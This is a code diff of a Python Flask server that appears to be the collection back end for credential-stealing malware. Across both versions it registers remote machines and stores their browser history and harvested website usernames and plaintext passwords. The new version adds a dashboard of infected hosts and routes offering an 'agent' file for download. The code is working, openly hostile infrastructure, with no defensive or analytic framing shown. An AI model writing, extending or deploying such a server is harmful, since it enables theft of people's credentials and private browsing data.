@@ -1,105 +1,84 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template, send_from_directory
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 import os
 
-# Get the directory where app.py is located
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-DB_PATH = os.path.join(BASE_DIR, 'pbl202-24.db')
-
 app = Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///hosts.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.config['UPLOAD_FOLDER'] = os.path.abspath(os.path.dirname(__file__))
 
 db = SQLAlchemy(app)
 
-# Models
-class Machine(db.Model):
+# ======================== MODELS ========================
+class Host(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    machine_id = db.Column(db.String(200), unique=True, nullable=False)
-    hostname = db.Column(db.String(200))
-    ip_address = db.Column(db.String(100))
-    os_info = db.Column(db.String(200))
-    registered_at = db.Column(db.DateTime, default=datetime.utcnow)
+    machine_id = db.Column(db.String(64), unique=True, nullable=False)
+    hostname = db.Column(db.String(64))
+    ip_address = db.Column(db.String(64))
+    os_info = db.Column(db.String(128))
+    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
 
-class BrowserHistory(db.Model):
+class History(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    machine_id = db.Column(db.String(200), db.ForeignKey('machine.machine_id'))
+    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
     url = db.Column(db.Text)
     title = db.Column(db.Text)
-    visit_time = db.Column(db.String(100))
-    browser_type = db.Column(db.String(50))
+    visit_time = db.Column(db.String(128))
+    browser_type = db.Column(db.String(16))
 
 class Credential(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    machine_id = db.Column(db.String(200), db.ForeignKey('machine.machine_id'))
-    website = db.Column(db.String(200))
-    username = db.Column(db.String(200))
-    password = db.Column(db.String(500))
-    browser_type = db.Column(db.String(50))
+    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
+    website = db.Column(db.String(256))
+    username = db.Column(db.String(128))
+    password = db.Column(db.Text)
+    browser_type = db.Column(db.String(16))
 
-# Routes
-@app.route('/register', methods=['POST'])
+# ======================== ROUTES ========================
+@app.route("/")
+def dashboard():
+    hosts = Host.query.all()
+    return render_template("index.html", hosts=hosts)
+
+@app.route("/register", methods=["POST"])
 def register():
     data = request.json
-    if not data or 'machine_id' not in data:
-        return jsonify({'error': 'Missing machine_id'}), 400
-
-    existing = Machine.query.filter_by(machine_id=data['machine_id']).first()
-    if existing:
-        return jsonify({'message': 'Already registered'}), 200
-
-    new_machine = Machine(
-        machine_id=data['machine_id'],
-        hostname=data.get('hostname', ''),
-        ip_address=data.get('ip_address', ''),
-        os_info=data.get('os_info', '')
-    )
-    db.session.add(new_machine)
+    host = Host.query.filter_by(machine_id=data['machine_id']).first()
+    if host:
+        host.last_seen = datetime.utcnow()
+    else:
+        host = Host(**data)
+        db.session.add(host)
     db.session.commit()
-    return jsonify({'message': 'Machine registered'}), 200
+    return jsonify({"status": "ok"})
 
-@app.route('/submit/history', methods=['POST'])
-def submit_history():
+@app.route("/submit/history", methods=["POST"])
+def receive_history():
     data = request.json
-    history_list = data.get('history', [])
-    machine_id = data.get('machine_id')
-
-    for entry in history_list:
-        history = BrowserHistory(
-            machine_id=machine_id,
-            url=entry['url'],
-            title=entry.get('title', ''),
-            visit_time=entry.get('visit_time', ''),
-            browser_type=entry.get('browser_type', '')
-        )
-        db.session.add(history)
-
+    for entry in data.get('history', []):
+        db.session.add(History(machine_id=data['machine_id'], **entry))
     db.session.commit()
-    return jsonify({'message': 'History submitted'}), 200
+    return jsonify({"status": "ok"})
 
-@app.route('/submit/credentials', methods=['POST'])
-def submit_credentials():
+@app.route("/submit/credentials", methods=["POST"])
+def receive_credentials():
     data = request.json
-    cred_list = data.get('credentials', [])
-    machine_id = data.get('machine_id')
-
-    for entry in cred_list:
-        cred = Credential(
-            machine_id=machine_id,
-            website=entry['website'],
-            username=entry['username'],
-            password=entry['password'],
-            browser_type=entry.get('browser_type', '')
-        )
-        db.session.add(cred)
-
+    for entry in data.get('credentials', []):
+        db.session.add(Credential(machine_id=data['machine_id'], **entry))
     db.session.commit()
-    return jsonify({'message': 'Credentials submitted'}), 200
+    return jsonify({"status": "ok"})
 
-# Entry point
-if __name__ == '__main__':
-    if not os.path.exists(DB_PATH):
-        with app.app_context():
-            db.create_all()
-    app.run(debug=True)
+@app.route("/download/agent")
+def download_page():
+    return render_template("download.html")
+
+@app.route("/download/<path:filename>")
+def download_file(filename):
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)
+
+# ======================== MAIN ========================
+if __name__ == "__main__":
+    with app.app_context():
+        db.create_all()
+    app.run(host="0.0.0.0", port=5000)
